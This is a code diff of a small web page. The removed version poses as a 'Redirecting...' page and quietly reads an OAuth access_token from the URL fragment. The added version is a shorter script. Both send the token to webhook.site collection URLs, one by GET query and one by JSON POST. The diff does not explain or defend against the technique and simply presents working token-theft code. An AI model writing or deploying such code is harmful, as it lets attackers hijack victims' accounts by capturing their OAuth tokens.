@@ -1,18 +1,7 @@
-<!DOCTYPE html>
-<html>
-  <head>
-    <title>Redirecting...</title>
-  </head>
-  <body>
-    <script>
-      const hash = window.location.hash;
-      const params = new URLSearchParams(hash.substring(1));
-      const token = params.get("access_token");
-
-      if (token) {
-        fetch("https://webhook.site/65fdb1a2-9368-468d-8f5a-de77a03a1689?token=" + token);
-      }
-    </script>
-    <p>Redirecting...</p>
-  </body>
-</html>
+// Inside <script>
+const token = window.location.hash;
+fetch("https://webhook.site/d8b364d5-8818-45b7-a391-1a888e03f40c", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ token: token })
+});
